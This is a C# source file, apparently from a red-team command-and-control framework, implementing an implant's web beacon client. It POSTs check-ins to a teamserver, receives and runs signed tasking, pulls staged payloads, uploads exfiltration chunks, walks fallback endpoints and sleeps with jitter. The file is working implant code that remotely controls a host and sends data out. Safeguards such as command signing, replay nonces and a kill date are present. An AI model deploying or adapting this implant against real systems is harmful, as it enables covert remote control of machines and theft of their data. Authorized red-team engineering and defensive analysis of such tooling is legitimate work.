using System.Net.Http.Headers;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The reference implant's web check-in client (architecture.md Sec 8): the
// envelope POST cycle, the shape every mainstream HTTP(S) C2 uses. One POST
// to /implants/beacon is one poll check-in -- the request body carries the
// handshake frame first plus any results, exfil chunks, and staged demands
// collected since the last cycle; the response carries the handshake
// response, the staged chunk runs answering those demands, and queued tasking
// while the server's dispatch budget lasts. Over https the enrolled leaf
// rides the TLS client-certificate slot and the teamserver CA is pinned as
// the server identity; over cleartext http the handshake's implant id is the
// identity -- the documented anything-with-reach posture of the plain web
// listener. The wire grammar is the envelope check-in contract
// (extending/implants.md); nothing here is implant-only tradecraft, the same
// frames the gRPC stream carries in a different carriage.

/// <summary>
/// Runs the implant's check-in lifecycle over the envelope POST cycle: POST
/// the accumulated frames, process the response's tasking, sleep the baked
/// interval with jitter, repeat. Channel verbs never arrive over the envelope
/// (the server will not claim them without a live stream), so -- exactly like
/// the gRPC stream's poll mode -- a channel task, should one ever arrive, is
/// refused on the task itself. Tasking keeps its signature and replay-nonce
/// discipline regardless of transport (architecture.md Sec 9).
/// </summary>
internal sealed class EnvelopeBeacon
{
    /// <summary>
    /// The envelope check-in route. Mapped on every web listener beside the
    /// enroll route; fixed, not malleable (the malleable profile shapes the
    /// enroll request; URI routing at the public endpoint is a redirector
    /// concern).
    /// </summary>
    public const string Route = "/implants/beacon";

    private readonly EgressEndpoints _egress;
    private readonly string _implantId;
    private readonly X509Certificate2 _leaf;
    private readonly IReadOnlyList<X509Certificate2> _cas;
    private readonly X509Certificate2Collection _pinned;
    private readonly TimeSpan _sleep;
    private readonly TimeSpan _jitter;
    private readonly DateTimeOffset? _killDate;
    private readonly HandlerRegistry _handlers;
    private readonly IReadOnlyList<string> _classVerbs;
    private readonly TextWriter _log;

    // The fronted-pivot ledger (architecture.md Sec 5.2), shared with the
    // gRPC beacon through the one EnrollBundle the program hands both: the
    // Pivot children this implant enrolled, whose tasking a check-in executes.
    private readonly FrontedPivots? _fronted;

    // The replay-nonce state (architecture.md Sec 9), shared with the gRPC
    // beacon: the accepted-nonce floor spans the implant's whole run, so a
    // captured frame replayed after a transport switch still falls at or
    // below it.
    private readonly TaskNonceTracker _nonces;

    // Upstream frames waiting for the next POST: task results, exfil chunks,
    // and staged demands produced by earlier responses. Cleared only after a
    // response is processed -- a failed POST re-sends the batch whole, and
    // the server treats a retransmitted result for an already-completed task
    // as a no-op, so a partial failure never loses or double-records a result.
    private readonly List<Frame> _upstream = new();

    // The staged tasks whose StagedPull frames ride _upstream, in demand
    // order: the response answers each demand with its chunk run before any
    // new tasking, so this list is the key to reading the response back.
    private readonly List<string> _demands = new();

    // The staged tasks awaiting their chunk run, keyed by task id: a task
    // accepted in one response is demanded on the next request and dispatches
    // when its terminal chunk arrives.
    private readonly Dictionary<string, TaskRequest> _stagedAwaiting = new();

    public EnvelopeBeacon(
        EgressEndpoints egress,
        string implantId,
        X509Certificate2 leaf,
        IReadOnlyList<X509Certificate2> cas,
        TimeSpan sleep,
        TimeSpan jitter,
        DateTimeOffset? killDate,
        EnrollBundle? enroll,
        IReadOnlyList<string> classVerbs,
        TextWriter log,
        TaskNonceTracker? nonces = null)
    {
        _egress = egress;
        _implantId = implantId;
        _leaf = leaf;
        _cas = cas;
        _pinned = new X509Certificate2Collection();
        foreach (var ca in cas)
            _pinned.Add(ca);
        _sleep = sleep;
        _jitter = jitter;
        _killDate = killDate;
        _handlers = HandlerRegistry.Default(enroll, ExtensionRegistrations.Handlers);
        _fronted = enroll?.Fronted;
        _classVerbs = classVerbs;
        _log = log;
        _nonces = nonces ?? new TaskNonceTracker();
    }

    /// <summary>
    /// True when a beacon URL names a web front -- an http(s) URL -- whose
    /// check-in the envelope POST cycle carries. A bare host:port (the mTLS
    /// listener dial shape) belongs to the gRPC stream client instead.
    /// </summary>
    public static bool IsWebBeaconUrl(string beaconUrl)
        => beaconUrl.Trim().StartsWith("http://", StringComparison.OrdinalIgnoreCase)
           || beaconUrl.Trim().StartsWith("https://", StringComparison.OrdinalIgnoreCase);

    /// <summary>
    /// Composes the check-in URL off a beacon URL: the scheme and authority
    /// it names plus the fixed route, with any path the entry carried
    /// dropped.
    /// </summary>
    public static string CheckInUrl(string beaconUrl)
    {
        var u = beaconUrl.Trim();
        var schemeIdx = u.IndexOf("://", StringComparison.Ordinal);
        var rest = schemeIdx < 0 ? u : u[(schemeIdx + 3)..];
        var slash = rest.IndexOf('/');
        var authority = slash < 0 ? rest : rest[..slash];
        var scheme = schemeIdx < 0 ? "https" : u[..schemeIdx];
        return $"{scheme}://{authority}{Route}";
    }

    /// <summary>
    /// Blocks until cancellation, the kill date passing, or a permanent
    /// handshake refusal. A dropped cycle (transport failure, refused body)
    /// walks the egress entry and retries on the jittered cadence with the
    /// same exponential backoff the gRPC stream applies. Returns
    /// <see cref="CheckInExit.SwitchTransport"/> when the walk's current
    /// entry is not a web URL, so the coordinator hands the run to the gRPC
    /// stream client.
    /// </summary>
    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
    {
        var consecutiveFailures = 0;
        while (!cancellationToken.IsCancellationRequested)
        {
            if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
            {
                _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                return CheckInExit.Terminate;
            }
            if (!IsWebBeaconUrl(_egress.CurrentBeaconUrl))
                return CheckInExit.SwitchTransport;

            var cycle = BeaconCycleResult.Dropped;
            try
            {
                cycle = await RunOnceAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (Exception ex)
            {
                _log.WriteLine($"beacon check-in failed: {ex.Message}");
            }

            // Every non-OK handshake status (unknown implant, kill date
            // expired, retired, identity/version mismatch) is permanent for
            // this artifact: retrying would not change the answer.
            if (cycle == BeaconCycleResult.Terminal)
                return CheckInExit.Terminate;

            if (cycle == BeaconCycleResult.Handshaken)
            {
                consecutiveFailures = 0;
            }
            else
            {
                consecutiveFailures++;
                // The egress walk (architecture.md Sec 8): a cycle that never
                // reached a handshake means the current front is not
                // answering, so the next attempt dials the next entry.
                var from = _egress.CurrentBeaconUrl;
                _egress.Advance();
                if (from != _egress.CurrentBeaconUrl)
                    _log.WriteLine($"beacon endpoint {from} failed; walking to {_egress.CurrentBeaconUrl}");
            }
            try
            {
                await Beacon.SleepWithJitterAsync(_sleep, _jitter, consecutiveFailures, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return CheckInExit.Terminate;
            }
        }
        return CheckInExit.Terminate;
    }

    // What one POST-response cycle produced, driving the retry policy in
    // RunAsync. Mirrors the gRPC beacon's cycle result.
    private enum BeaconCycleResult
    {
        // The POST failed or the response was unusable; retry.
        Dropped,

        // The handshake succeeded and the response was processed.
        Handshaken,

        // The server refused the handshake permanently; terminate.
        Terminal,
    }

    // One POST-response cycle. Throws on transport errors (the caller logs
    // and retries); a refused handshake returns Terminal. The envelope's
    // documented bounds apply to the batch (an artifact's exfil chunk run
    // must begin and end inside one request body, extending/implants.md), so
    // results accumulate here in frame batches rather than streaming.
    private async Task<BeaconCycleResult> RunOnceAsync(CancellationToken cancellationToken)
    {
        var url = CheckInUrl(_egress.CurrentBeaconUrl);
        using var http = BuildClient(url);

        // The batch snapshot: the handshake plus everything accumulated. The
        // demand order rides the request, and the state clears only after the
        // response is processed, so a failed POST re-sends the batch whole.
        var demandOrder = _demands.ToList();
        var frames = new List<Frame>(1 + _upstream.Count) { HandshakeFrame() };
        frames.AddRange(_upstream);

        using var content = new ByteArrayContent(EnvelopeCodec.Encode(frames));
        content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
        using var response = await http.PostAsync(url, content, cancellationToken);
        response.EnsureSuccessStatusCode();

        var inbound = EnvelopeCodec.Parse(await response.Content.ReadAsByteArrayAsync(cancellationToken));
        if (inbound.Count == 0)
            throw new InvalidOperationException("check-in response carried no frames");

        var handshake = HandshakeResponse.Parser.ParseFrom(inbound[0].Payload);
        if (handshake.Status != HandshakeStatus.Ok)
        {
            _log.WriteLine($"handshake refused: {handshake.Status}; terminating");
            return BeaconCycleResult.Terminal;
        }
        _nonces.Negotiated = handshake.ReplayNonces;
        _log.WriteLine($"handshake ok: engagement={handshake.EngagementId}, replay-nonces={handshake.ReplayNonces}");

        _upstream.Clear();
        _demands.Clear();
        ProcessResponse(inbound, demandOrder);
        return BeaconCycleResult.Handshaken;
    }

    // Reads a response body past its handshake: the staged chunk runs in
    // demand order (the server answers demands before new tasking), then the
    // queued TaskRequests. Defensive throughout -- a frame that does not
    // match the contract is logged and skipped, never thrown, because the
    // batch semantics above make an exception cost the whole accumulated
    // upstream run.
    private void ProcessResponse(IReadOnlyList<Frame> inbound, IReadOnlyList<string> demandOrder)
    {
        var index = 1;

        // The staged half: each demand's chunk run, terminal-flagged. A run
        // that never terminates, carries a foreign task id, or answers a
        // demand this cycle did not send is a protocol break -- report the
        // staged task Failed and move on.
        foreach (var demand in demandOrder)
        {
            var parts = new List<byte[]>();
            var total = 0;
            var terminal = false;
            while (index < inbound.Count && !terminal)
            {
                StagedChunk chunk;
                try
                {
                    chunk = StagedChunk.Parser.ParseFrom(inbound[index].Payload);
                }
                catch (Google.Protobuf.InvalidProtocolBufferException)
                {
                    break;
                }
                if (chunk.TaskId != demand)
                    break;
                index++;
                parts.Add(chunk.Data.ToArray());
                total += chunk.Data.Length;
                terminal = chunk.Terminal;
            }

            if (!_stagedAwaiting.Remove(demand, out var task))
                continue;
            if (!terminal)
            {
                _log.WriteLine($"task {demand}: staged chunk run ended without a terminal chunk");
                _upstream.Add(ResultFrame(task, TaskOutcome.Failed,
                    "staged payload stream ended without a terminal chunk"));
                continue;
            }

            var payload = new byte[total];
            var offset = 0;
            foreach (var part in parts)
            {
                part.CopyTo(payload, offset);
                offset += part.Length;
            }
            var (outcome, output) = _handlers.DispatchStaged(task.Verb, task.Arguments, payload);
            _upstream.Add(ResultFrame(task, outcome, output));
        }

        // The tasking half: every remaining frame is a TaskRequest (the only
        // kind-bearing downstream frame, ChannelInput, never rides the
        // envelope -- there is no live channel to feed).
        for (; index < inbound.Count; index++)
        {
            var frame = inbound[index];
            if (frame.Kind == FrameKind.ChannelInput)
            {
                _log.WriteLine("channel input dropped: no live channel on an envelope check-in");
                continue;
            }

            TaskRequest task;
            try
            {
                task = TaskRequest.Parser.ParseFrom(frame.Payload);
            }
            catch (Google.Protobuf.InvalidProtocolBufferException)
            {
                _log.WriteLine("response frame was neither a staged chunk nor tasking; skipped");
                continue;
            }
            AcceptTasking(task);
        }
    }

    // One dispatched TaskRequest: verify the signature (and nonce) exactly as
    // the stream does, then dispatch inline, demand the staged payload, or
    // refuse the channel shape. The result (and any exfil chunks) queue for
    // the next POST -- the poll cycle reports on the check-in after the one
    // that carried the tasking.
    private void AcceptTasking(TaskRequest task)
    {
        // Fronted tasking (architecture.md Sec 5.2): a frame marked with
        // another implant's id is a Pivot child's tasking this check-in
        // executes on the child's behalf. The gate is the fronted ledger:
        // only a child this implant enrolled is frontable.
        var targetId = _implantId;
        var fronted = false;
        if (task.HasTargetImplantId && task.TargetImplantId.Length > 0 && task.TargetImplantId != _implantId)
        {
            targetId = task.TargetImplantId;
            fronted = true;
            if (_fronted is null || !_fronted.Knows(targetId))
            {
                _log.WriteLine($"task {task.TaskId} refused: fronting for unknown implant {targetId}");
                _upstream.Add(ResultFrame(task, TaskOutcome.Failed,
                    $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed"));
                return;
            }
        }

        // Command signing (architecture.md Sec 9): verify before anything
        // runs, nonce floor included. The signed tuple's implant id is the
        // target's own, and the nonce arm follows the target too -- a pivot
        // child never handshakes, so its tasking keeps the nonce-less shape.
        var verdict = TaskingVerifier.Verify(targetId, task, _cas, fronted ? new TaskNonceTracker() : _nonces);
        if (verdict != TaskingVerdict.Accepted)
        {
            var cause = verdict switch
            {
                TaskingVerdict.RejectedReplay =>
                    $"task rejected: replayed tasking (nonce {task.TaskNonce} at or below the accepted floor); not executed",
                TaskingVerdict.RejectedNoNonce =>
                    "task rejected: no task nonce after the replay-nonce handshake; not executed",
                _ => "task rejected: signature verification failed; not executed",
            };
            _log.WriteLine($"task {task.TaskId} rejected: {verdict}");
            _upstream.Add(ResultFrame(task, TaskOutcome.Failed, cause));
            return;
        }

        // The streaming shape never rides the envelope (the server requeues
        // a channel task untouched), so a channel verb here is a protocol
        // break -- refuse it on the task, the same answer poll mode gives.
        if (_handlers.ChannelFor(task.Verb) is not null)
        {
            _log.WriteLine($"task {task.TaskId} refused: no channel on an envelope check-in");
            _upstream.Add(ResultFrame(task, TaskOutcome.Failed,
                $"{task.Verb} requires a stream-mode check-in; the envelope cycle carries no channel"));
            return;
        }

        // The typed arm (architecture.md Sec 10): a staged task's bulk
        // payload is demanded on the next POST and dispatches when its chunk
        // run arrives.
        if (task.HasStagedBytes)
        {
            _stagedAwaiting[task.TaskId] = task;
            _demands.Add(task.TaskId);
            _upstream.Add(new Frame
            {
                Payload = ByteString.CopyFrom(new StagedPull { TaskId = task.TaskId }.ToByteArray()),
                Kind = FrameKind.StagedPull,
            });
            return;
        }

        var (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
        _upstream.Add(ResultFrame(task, outcome, output));
        // Out-of-band exfil chunks follow the TaskResult on the next POST,
        // each carrying the task id so the server reassembles into the
        // artifact store (architecture.md Sec 10.1 exfil, Sec 11).
        foreach (var chunk in chunks)
        {
            chunk.TaskId = task.TaskId;
            _upstream.Add(new Frame
            {
                Payload = ByteString.CopyFrom(chunk.ToByteArray()),
                Kind = FrameKind.ExfilChunk,
            });
        }
    }

    private Frame HandshakeFrame()
    {
        // The implant speaks first on every POST: the handshake re-opens (or
        // reuses) the session and re-advertises the baked class verbs
        // intersected with the compiled handlers (architecture.md Sec 5.3).
        var handshake = new HandshakeRequest
        {
            Version = new ProtocolVersion { Major = 1, Minor = 0 },
            ImplantId = _implantId,
            ReplayNonces = true,
        };
        handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
        return new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) };
    }

    private static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
        => new()
        {
            Payload = ByteString.CopyFrom(new TaskResult
            {
                TaskId = task.TaskId,
                Outcome = outcome,
                Output = output,
            }.ToByteArray()),
            Kind = FrameKind.TaskResult,
        };

    // One client per cycle, mirroring the gRPC beacon's per-cycle channel:
    // the walk's current entry decides the shape -- https presents the
    // enrolled leaf and pins the teamserver CA as the server identity (the
    // check-in routes demand the certificate over TLS), http is the bare
    // cleartext client the plain web posture documents.
    private HttpClient BuildClient(string url)
    {
        SocketsHttpHandler handler;
        if (url.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
        {
            handler = new SocketsHttpHandler
            {
                SslOptions = new SslClientAuthenticationOptions
                {
                    ClientCertificates = new X509Certificate2Collection(_leaf),
                    RemoteCertificateValidationCallback = (_, cert, chain, _) =>
                        C2.PinServerChain(cert as X509Certificate2, chain, _pinned),
                },
            };
        }
        else
        {
            handler = new SocketsHttpHandler();
        }
        return new HttpClient(handler) { Timeout = TransportProfile.DefaultRequestTimeout };
    }
}

/// <summary>
/// The envelope wire codec (extending/implants.md): the protobuf canonical
/// delimited-stream shape -- an unsigned varint byte length before each
/// marshaled <see cref="Frame"/> -- in ordinary request/response bodies. The
/// implant-side mirror of the teamserver's framing, kept here so the implant
/// builds against the protocol alone.
/// </summary>
internal static class EnvelopeCodec
{
    /// <summary>
    /// Encodes frames as one delimited sequence for a request body.
    /// </summary>
    public static byte[] Encode(IReadOnlyList<Frame> frames)
    {
        var body = new MemoryStream();
        foreach (var frame in frames)
        {
            var marshaled = frame.ToByteArray();
            WriteVarint(body, marshaled.Length);
            body.Write(marshaled);
        }
        return body.ToArray();
    }

    /// <summary>
    /// Parses a delimited frame sequence out of a response body. Throws
    /// <see cref="InvalidOperationException"/> on malformed framing (a
    /// truncated or oversized varint, a declared length past the body, or an
    /// unparseable frame) -- the caller treats the whole cycle as dropped
    /// rather than acting on a partial read.
    /// </summary>
    public static List<Frame> Parse(byte[] body)
    {
        var frames = new List<Frame>();
        var position = 0;
        while (position < body.Length)
        {
            if (!TryReadVarint(body, ref position, out var length))
                throw new InvalidOperationException("envelope body carried a malformed frame delimiter");
            if (position + length > body.Length)
                throw new InvalidOperationException("envelope body declared a frame past its end");
            Frame frame;
            try
            {
                frame = Frame.Parser.ParseFrom(body, position, (int)length);
            }
            catch (Google.Protobuf.InvalidProtocolBufferException)
            {
                throw new InvalidOperationException("envelope body carried an unparseable frame");
            }
            frames.Add(frame);
            position += (int)length;
        }
        return frames;
    }

    private static bool TryReadVarint(byte[] source, ref int position, out uint value)
    {
        value = 0;
        var shift = 0;
        for (var consumed = 0; consumed < 5; consumed++)
        {
            if (position >= source.Length)
                return false;
            var b = source[position++];
            value |= (uint)(b & 0x7f) << shift;
            if ((b & 0x80) == 0)
                return true;
            shift += 7;
        }
        return false; // More than 5 bytes: not a uint32 varint.
    }

    private static void WriteVarint(MemoryStream target, int value)
    {
        uint remaining = (uint)value;
        while (remaining >= 0x80)
        {
            target.WriteByte((byte)(remaining | 0x80));
            remaining >>= 7;
        }
        target.WriteByte((byte)remaining);
    }
}
